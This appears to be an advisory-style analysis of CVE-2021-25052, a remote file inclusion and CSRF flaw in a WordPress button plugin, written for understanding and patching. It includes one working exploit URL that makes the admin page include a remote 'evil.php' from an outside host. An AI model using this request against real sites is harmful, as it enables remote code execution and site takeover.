Based on the provided information, here's an analysis of CVE-2021-25052:

**Root Cause of Vulnerability:**
The vulnerability stems from the `button-generation` plugin's improper handling of user-supplied input within the `wow-company` admin menu page. Specifically, the plugin uses `include()` to process a `tab` parameter from the URL without sufficient sanitization, allowing arbitrary file inclusion.

**Weaknesses/Vulnerabilities Present:**
*   **Remote File Inclusion (RFI):** The plugin directly includes the value provided in the `tab` parameter via the `include()` function. This allows an attacker to specify a remote file (via `http://` protocol) or even data streams (via `data://` protocol) for inclusion if `allow_url_include` is set to "On" in the PHP configuration.
*   **Cross-Site Request Forgery (CSRF):**  The vulnerability can be exploited via CSRF attacks because it affects a functionality within the admin panel without proper nonce validation. An attacker can craft a malicious request that, when triggered by an authenticated admin user, will cause the vulnerable plugin to include a malicious file.
*   **Lack of Input Sanitization**: The plugin does not sanitize or validate the `tab` parameter before using it in the `include()` function. This lack of security makes the plugin vulnerable to RFI.

**Impact of Exploitation:**
*   **Remote Code Execution (RCE):** By including a malicious PHP file, the attacker can achieve arbitrary code execution on the server. This can lead to complete compromise of the WordPress site.
*   **Full System Compromise:** Successful RCE allows attackers to execute system commands, install malware, steal sensitive data, or deface the website, among other malicious activities.

**Attack Vectors:**
*   **HTTP GET Request:** The attack is carried out by crafting a specific GET request to the `wp-admin/admin.php` endpoint, providing a malicious URL or data stream through the `tab` parameter (e.g., `http://127.0.0.1:8001/wp-admin/admin.php?page=wow-company&tab=https%3A%2F%2Fstatic.kazet.cc%2Fevil.php%3F`).
*   **CSRF:** Attackers can embed a malicious request within a page, or via other methods, and when a logged in admin visits the page, the malicious file is included without their awareness.

**Required Attacker Capabilities/Position:**
*   **Knowledge of Vulnerable Plugin:** The attacker needs to be aware of the `button-generation` plugin and its vulnerability.
*   **Target is an authenticated Admin User:**  A logged-in admin user must visit a malicious page or be tricked into triggering the crafted request for exploitation via CSRF.
*   **PHP allow\_url\_include enabled:**  For remote file inclusion via `http://` protocol, the `allow_url_include` directive in the PHP configuration on the target server must be enabled.
*   **Ability to craft URLs/requests:** The attacker must have the ability to craft malicious URLs or requests to exploit the RFI and/or CSRF vulnerability.

**Additional Information:**
* The vulnerability was fixed in version 2.3.3 of the plugin.
* The vulnerability has a CVSS score of 8.4, which is considered high severity.
* The vulnerability is classified under CWE-94 (Improper Control of Generation of Code).
* The researcher that discovered this vulnerability is Krzysztof ZajÄ…c.
